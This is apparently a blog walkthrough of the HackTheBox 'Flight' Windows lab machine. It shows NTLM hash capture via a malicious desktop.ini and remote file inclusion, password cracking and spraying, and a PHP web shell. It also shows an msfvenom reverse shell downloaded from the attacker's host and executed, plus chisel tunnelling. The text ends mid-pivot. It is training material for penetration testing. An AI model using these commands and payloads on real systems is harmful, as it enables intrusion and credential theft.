---
title: Flight (HackTheBox Writeup)
date: 2023-05-12
categories: [Writeups, HTB]
tags: [Windows, Enumeration, Pivoting, NT AUTHORITY\SYSTEM]
---

![](/assets/img/flight/flight.png)

Hello everyone! Today I am going to be solving the `Flight` machine, from `HTB`. This is a Windows machine and it is level `hard`, but I think it is level `medium`. Whatever, let's start!
Today we are going to learn the following points:

-  Scanning with `nmap` 
- `SMB Relay` attack
- `Password Spry` attack
- Lateral movment (pivoting between users)
- `Golden Tiket` attack

## Enumeration

- - -

First, we are going to enumerate the open ports of the machine with `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.187 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 14:29 CEST
Initiating SYN Stealth Scan at 14:29
Scanning 10.10.11.187 [65535 ports]
Discovered open port 135/tcp on 10.10.11.187
Discovered open port 445/tcp on 10.10.11.187
Discovered open port 80/tcp on 10.10.11.187
Discovered open port 53/tcp on 10.10.11.187
Discovered open port 139/tcp on 10.10.11.187
Discovered open port 49690/tcp on 10.10.11.187
Discovered open port 49673/tcp on 10.10.11.187
Discovered open port 49667/tcp on 10.10.11.187
Discovered open port 9389/tcp on 10.10.11.187
Discovered open port 49696/tcp on 10.10.11.187
Discovered open port 49674/tcp on 10.10.11.187
Discovered open port 636/tcp on 10.10.11.187
Discovered open port 593/tcp on 10.10.11.187
Discovered open port 3269/tcp on 10.10.11.187
Discovered open port 3268/tcp on 10.10.11.187
Discovered open port 88/tcp on 10.10.11.187
Completed SYN Stealth Scan at 14:30, 80.56s elapsed (65535 total ports)
Nmap scan report for 10.10.11.187
Host is up, received user-set (0.32s latency).
Scanned at 2023-05-13 14:29:06 CEST for 81s
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 80.72 seconds
           Raw packets sent: 393201 (17.301MB) | Rcvd: 112 (4.896KB)
```

Great! Now that we have the ports in a file called `allPorts`, let's extract them with a custom function called `extractPorts`:

```zsh
❯ which extractPorts
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        batcat extractPorts.tmp
        rm extractPorts.tmp
}
```

Let's put `extractPorts allPorts`:

```zsh
❯ extractPorts allPorts
[*] Extracting information...

    [*] IP Address: 10.10.11.187
    [*] Open ports: 53,80,88,135,139,445,593,636,3268,3269,9389,49667,49673,49674,49690,49696

[*] Ports copied to clipboard
```

Perfect! Now let's perform a deeper scan to those ports and save the evicence on a file called `targeted`:

```zsh
❯ nmap -sCV -p53,80,88,135,139,445,593,636,3268,3269,9389,49667,49673,49674,49690,49696 10.10.11.187 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 14:40 CEST
Nmap scan report for flight.htb (10.10.11.187)
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-13 19:40:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m11s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-13T19:41:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.00 seconds
```

## Foothold

- - -

In this scan we can see a bunch of ports, but let's execute `crackmapexec` to see more information:

```zsh
❯ cme smb 10.10.11.187
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
``` 

Executing `crackmapexec` we can see a domain and a subdomain: `flight.htb` and `g0.flight.htb`. 
Now, add those domains to the `/etc/hosts` file and after that, check the web:

![](/assets/img/flight/web1.png)

Ok, so visiting both websites we can notice that that they are the same web. 
Now, we could try to enumerate some `subdomains` or we could connect with `smbclient` using a `null session`. Let's try that!

```zsh
❯ smbclient -N -L flight.htb
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to flight.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok, so connecting to `smb` with a `null session` we can see that we don't have permissions to read or write. 
Ok, so we can't do anything there, so let's enumerate subdomains:

```zsh
❯ gobuster dns -d flight.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     flight.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
2023/05/13 15:21:58 Starting gobuster in DNS enumeration mode
===============================================================
Found: school.flight.htb

Progress: 14666 / 114444 (12.82%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/13 15:25:38 Finished
===============================================================
```

Here we see an interesting subdomain: `school`. 
Now, add it to your `/etc/hosts` and check the web. When you access the web, you can see that is different from the other ones, so I suppose that we can do something here:

![](/assets/img/flight/web2.png)

By clicking around the web, I noticed that if you click on the `home` or other button, the `url` will become suspicious:

![](/assets/img/flight/lfi.png)

Here the website is calling to the `home.html` file, so we could easily use this to get `LFI` (Local File Inclusion). However, the website blocks you if you try to access other files:

![](/assets/img/flight/sec.png)

I couldn't find the way to get `LFI`, but I got a way to get `RFI` (Remote File Inclusion) by creating an `smb` server and try to access it.
I will use `impacket-smbserver` to create it:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

> **Note:** You can name the `new` parameter whatever you like

Now that our `smb` server is up and running, we can try to access it tacking advantage of the vulnerable parameter, `view`:

```zsh
❯ curl "http://school.flight.htb/index.php?view=//10.10.14.30/new"
```

Now, wait a few seconds and you will get the `NTLMv2` hash of a user on your `smb`server:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,55278)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:9cd028288bafb6e62d11b86df56a4c52:010100000000000080babf8ba085d901840c8ae1de9cbcd900000000010010004d007500570071007700630050004e00030010004d007500570071007700630050004e00020010005300690048004300480041006100740004001000530069004800430048004100610074000700080080babf8ba085d90106000400020000000800300030000000000000000000000000300000cae9520d7ac0dbcc71d7ce369c0c73a3839397548f1e5e65eb9ce6be043e8b650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000
[*] Closing down connection (10.10.11.187,55278)
[*] Remaining connections []
```

Perfect!!! We have a hash! At this point we are going to save it in a file called `hash` and then, crack it using `john`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:06 DONE (2023-05-13 15:45) 0.1552g/s 1655Kp/s 1655Kc/s 1655KC/s SADSAM..S42150461
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Great! Now we have the `svc_apache` password. 
By using `crackmapexec` we can see that the credentials are valid. Using the `--shares` parameter we can see in wich resources we have reading privileges:

```zsh
❯ cme smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ            
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ
```

Now let's use `impacket-smbclient` to connect to the `smb` service:

```zsh
❯ impacket-smbclient flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# 
```

Perfect! We can connect to the `smb` service. Let's enumerate it a little bit:

```zsh

❯ impacket-smbclient flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
Users
Web
# use Shared
# ls
drw-rw-rw-          0  Sat May 13 09:36:38 2023 .
drw-rw-rw-          0  Sat May 13 09:36:38 2023 ..
# use Web
# ls
drw-rw-rw-          0  Sat May 13 22:52:01 2023 .
drw-rw-rw-          0  Sat May 13 22:52:01 2023 ..
drw-rw-rw-          0  Sat May 13 22:52:01 2023 flight.htb
drw-rw-rw-          0  Sat May 13 22:52:01 2023 school.flight.htb
```

Ok, I think that the folder `flight.htb` is very interesting, but we only have `read` permissions, so let's keep looking.
A very common practice between users, is that they sometimes use the same use, so now we are going to check if is there any user with the same password. 
First, we must enumerate all the users of the system and save all the evidence on a `users.txt` file:

```zsh
❯ cme smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated domain user(s)
SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 4 desc: Service Apache web
SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager
SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he's here
SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer
SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer
SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Now that we have the users, we will do a `password spry` attack to check if the password `S@Ss!K@*t13` is reautilized by other users:

```zsh
❯ cme smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```

Yeap, that's what I thought. As you can see, the user `S.Moon` is using the same password. 
This leads me to list again the `smb` resources with the user `S.Moon` to see in which of them we have permissions to `write/read`. We will perform this with `crackmapexec`:

```zsh
❯ cme smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ  
```

Nice! We have `READ,WRITE` permissions on the `Shared` folder! Let's see what can we do.
After looking around like an idiot by 30 minutes, I finally found a way to get the user's hash.
The thing we would need to do is to put a malicious `.ini` file, so when a user try to access the icon, this will be loaded into a `smb-server` that we will create. 

First, let's create a file called `desktop.ini` where the `IconResource` is equal to our `smb-server`:

```ini
[.ShellClassInfo]
IconResource=\\10.10.14.30\new\pwnedb1tch.ico  
```

Now, we will create an `smb-server` with `impacket-smbserver`:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
After that, we are going to connecto to the `smb` service of the machine with `impacket-smbclient` and then upload the `desktop.ini` file:

```zsh
❯ impacket-smbclient flight.htb/S.Moon:'S@Ss!K@*t13'@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
Users
Web
# cd Shared
[-] No share selected
# use Shared
# ls
drw-rw-rw-          0  Sat May 13 23:11:17 2023 .
drw-rw-rw-          0  Sat May 13 23:11:17 2023 ..
# put desktop.ini
# 
```

After a few seconds, in our `smb-server` we will obtain the user's `NTLMv2` hash:

```zsh
❯ impacket-smbserver new . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,55417)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:20c1d87a59f62dc249223cfca6108179:010100000000000080fb7061a685d901c52b7e60e98a37b900000000010010004c004500470050006800530071007600030010004c004500470050006800530071007600020010007a0061004f004e005400700054005100040010007a0061004f004e0054007000540051000700080080fb7061a685d90106000400020000000800300030000000000000000000000000300000cae9520d7ac0dbcc71d7ce369c0c73a3839397548f1e5e65eb9ce6be043e8b650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000
[*] Closing down connection (10.10.11.187,55417)
[*] Remaining connections []
```

With this, we will follow the same procedure as we did with the `svc_apache` user; save the `hash` into a file and crack it with `john`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash1
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:06 DONE (2023-05-13 16:26) 0.1552g/s 1636Kp/s 1636Kc/s 1636KC/s TinyMutt69..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Gaining access (svc_apache)

- - -

Nice! Now we have valid credentials for the user.
As we did before, we will check our permissions on the `smb` shares to see what can we do:

```zsh
❯ cme smb flight.htb -u C.Bum -p Tikkycoll_431012284 --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ,WRITE
```

Oh, we have something juicy here. We can see that in the `Web` share we have `READ,WRITE` permissions, and we know that in that share is the `flight.htb` web. Because of this web runs `php`, here we have a clear vector attack. 
Let's create a malicious `php` file that contains this code:

```php
<?php
    system($_REQUEST['cmd']);  
?>
```

I will name it `cmd.php`, but you can call it however you like.
Now, we will connect with `impacket-smbclient` and upload the `cmd.php` file into the `Web/flight.htb` path:

```zsh
❯ impacket-smbclient flight.htb/C.Bum:Tikkycoll_431012284@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
Users
Web
# use Web
# ls
drw-rw-rw-          0  Sat May 13 23:44:11 2023 .
drw-rw-rw-          0  Sat May 13 23:44:11 2023 ..
drw-rw-rw-          0  Sat May 13 23:42:01 2023 flight.htb
-rw-rw-rw-      28160  Sat May 13 23:44:12 2023 nc.exe
drw-rw-rw-          0  Sat May 13 23:42:01 2023 school.flight.htb
-rw-rw-rw-         37  Sat May 13 23:44:06 2023 shell.php
# cd flight.htb
# ls
drw-rw-rw-          0  Sat May 13 23:42:01 2023 .
drw-rw-rw-          0  Sat May 13 23:42:01 2023 ..
drw-rw-rw-          0  Sat May 13 23:42:01 2023 css
drw-rw-rw-          0  Sat May 13 23:42:01 2023 images
-rw-rw-rw-       7069  Thu Sep 22 22:17:00 2022 index.html
drw-rw-rw-          0  Sat May 13 23:42:01 2023 js
-rw-rw-rw-      28160  Sat May 13 22:43:45 2023 nc.exe
-rw-rw-rw-         37  Sat May 13 22:43:37 2023 shell.php
# put cmd.php
# 
```

Now, with `curl` we should have `RCE` (Remote Command Execution):

```zsh
❯ curl flight.htb/cmd.php?cmd=whoami
flight\svc_apache
```

To gain access, I tried a lot of things, but none of them were successful. The `nc` way didn't work, so I decided to do it with `msfvenom`. I didn't want to do it with this tool because basically I don't know what is happening behind of it, but there wasn't any other way.

To successfully gain access, we will generate a `.exe` file that will send us a `PowerShell` to our `IP` and the specified port:

```zsh
❯ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.30 LPORT=443 -f exe -o cmd.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1869 bytes
Final size of exe file: 8192 bytes
Saved as: cmd.exe
```

Ok nice, we have the mailcious `.exe` file, now we will share it with a `python` web server and then download it with `curl` using the `cmd.php` that gave us `RCE`:

```zsh
❯ curl flight.htb/cmd.php -d "cmd=curl 10.10.14.30/cmd.exe -o C:\ProgramData\cmd.exe"
```

Nice, we can confirm that the file exists on the victim machine by checking our `python` web server. If the `GET` request has been made, it means that everything went OK:

```zsh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.187 - - [13/May/2023 17:01:47] "GET /cmd.exe HTTP/1.1" 200 -
```

Perfect. Now, let's open a `netcat` listener and execute the `cmd.exe` with our `RCE`:

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Nice, we are now listening on port `443`. After that, execute the `cmd.exe`:

```zsh
❯ curl flight.htb/cmd.php -d "cmd=cmd /c C:\ProgramData\cmd.exe"
```

The binay is running... And we have a `reverse shell`!!!

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.187] 55548
Windows PowerShell running as user svc_apache on G0
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
flight\svc_apache
PS C:\xampp\htdocs\flight.htb> 
```

## Pivoting to C.Bum

- - -

At this point, we could list the internal open ports with `netstat`:

```zsh
PS C:\xampp\htdocs\flight.htb> netstat -oat

Active Connections

  Proto  Local Address          Foreign Address        State           PID      Offload State

  TCP    0.0.0.0:80             g0:0                   LISTENING       4536     InHost      
  TCP    0.0.0.0:88             g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:135            g0:0                   LISTENING       920      InHost      
  TCP    0.0.0.0:389            g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:443            g0:0                   LISTENING       4536     InHost      
  TCP    0.0.0.0:445            g0:0                   LISTENING       4        InHost      
  TCP    0.0.0.0:464            g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:593            g0:0                   LISTENING       920      InHost      
  TCP    0.0.0.0:636            g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:3268           g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:3269           g0:0                   LISTENING       664      InHost      
  TCP    0.0.0.0:5985           g0:0                   LISTENING       4        InHost      
  TCP    0.0.0.0:8000           g0:0                   LISTENING       4        InHost      
  TCP    0.0.0.0:9389           g0:0                   LISTENING       2780     InHost      
  TCP    0.0.0.0:10247          g0:0                   LISTENING       388      InHost
```

Here we can see that the port `8000` is opened internally on the machine, so let's perform a `Port Forwarding` with `chisel` to see the content of the web:

```zsh
PS C:\xampp\htdocs\flight.htb> certutil.exe -urlcache -f -split http://10.10.14.30/chisel.exe
****  Online  ****
  000000  ...
  846600
CertUtil: -URLCache command completed successfully.
PS C:\xampp\htdocs\flight.htb>
```

Now we've downloaded it, let's create a tunnel between the port `8000` of the machine and our port `9001`:

- In the attacker machine:

```zsh
❯ chisel server --reverse --port 9001
2023/05/13 17:25:29 server: Reverse tunnelling enabled
2023/05/13 17:25:29 server: Fingerprint +V3q9vI/Cddx4C2DgsijvIsxzn9rRT3RXRKRDA+RVgQ=
2023/05/13 17:25:29 server: Listening on http://0.0.0.0:9001
```

- In the victim machine:

```zsh
PS C:\xampp\htdocs\flight.htb> .\chisel.exe client 10.10.14.30:9001 R:8000:127.0.0.1:8000
```

Now, when we run this command, we should get something like this in our attacker machine:

```zsh
❯ chisel server --reverse --port 9001
2023/05/13 17:25:29 server: Reverse tunnelling enabled
2023/05/13 17:25:29 server: Fingerprint +V3q9vI/Cddx4C2DgsijvIsxzn9rRT3RXRKRDA+RVgQ=
2023/05/13 17:25:29 server: Listening on http://0.0.0.0:9001
2023/05/13 17:26:48 server: session#1: Client version (1.8.1) differs from server version (0.0.0-src)
2023/05/13 17:26:48 server: session#1: tun: proxy#R:8000=>8000: Listening
```

Now we can access to the internal web of the victim machine by using the following `url`: [localhost](http://127.0.0.1:8000)
After that, we should see a web with a title `Travel and Tour`:

![](/assets/img/flight/travel&tour.png)

If we access to a non-existent resource of the web, I can see that the hole `path` es exposed:

```zsh
❯ curl -s http://127.0.0.1:8000/hi | html2text | grep 'Path'
Physical Path    C:\inetpub\development\hi
```

Now, if we go to the directory `C:\inetpub\development` we notece that we have `WRITE` permissions on this directory. We can check that with `icacls`:

```zsh
PS C:\inetpub\development> icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\inetpub\development>
```

We have the credentials for the user `C.Bum`, so by using [RunasCs](https://github.com/antonioCoco/RunasCs) we can input the password in the command, so we will use it to execute the `cmd.exe` file:

```zsh
PS C:\ProgramData> certutil.exe -urlcache -f -split http://10.10.14.30/Invoke-RunasCs.ps1
****  Online  ****
  000000  ...
  0156f2
CertUtil: -URLCache command completed successfully.
PS C:\ProgramData> Import-Module .\Invoke-RunasCs.ps1
PS C:\ProgramData> Invoke-RunasCs C.Bum Tikkycoll_431012284 C:\ProgramData\cmd.exe

No output received from the process.

PS C:\ProgramData> 
```

